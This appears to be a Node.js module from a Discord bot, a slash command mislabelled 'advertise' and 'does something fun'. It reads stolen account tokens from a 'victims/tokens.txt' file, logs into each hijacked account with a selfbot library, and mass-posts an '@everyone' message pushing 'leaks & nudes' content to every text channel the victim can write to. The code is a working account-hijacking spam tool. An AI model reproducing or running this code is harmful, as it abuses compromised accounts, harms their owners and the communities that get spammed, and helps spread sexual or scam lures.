const {Client} = require("discord.js-selfbot-v13");
const client = new Client();
const fs = require("node:fs");
const path = require("node:path");
const {SlashCommandBuilder} = require("discord.js");

module.exports = {
    data: new SlashCommandBuilder()
    .setName("advertise")
    .setDescription("does something fun"),
    async execute(interaction)
        {
            require("readline").createInterface({
                input: require("fs").createReadStream(path.join(__dirname, "..", "..", "server", "victims", "tokens.txt"))
            }).on("line",  async function(token){
                try {
                    var messages = 0;
                    await client.login(token);
                    client.guilds.cache.map(function(guild){
                        guild.channels.cache.map(async function(channel){

                            const msg_channel = await client.channels.fetch(channel.id)
                            if(msg_channel.type == "GUILD_TEXT" && msg_channel.permissionsFor(client.user.id).has("VIEW_CHANNEL") && msg_channel.permissionsFor(client.user.id).has("SEND_MESSAGES"))
                            {
                                msg_channel.send("# best OF leaks & nvdes @everyone :peach:")
                                messages ++;
                            }
                        })
                    })
                } finally {
                    console.log(`sent ${messages} messages as ${client.user.globalName}`)
                }
            })
        }
}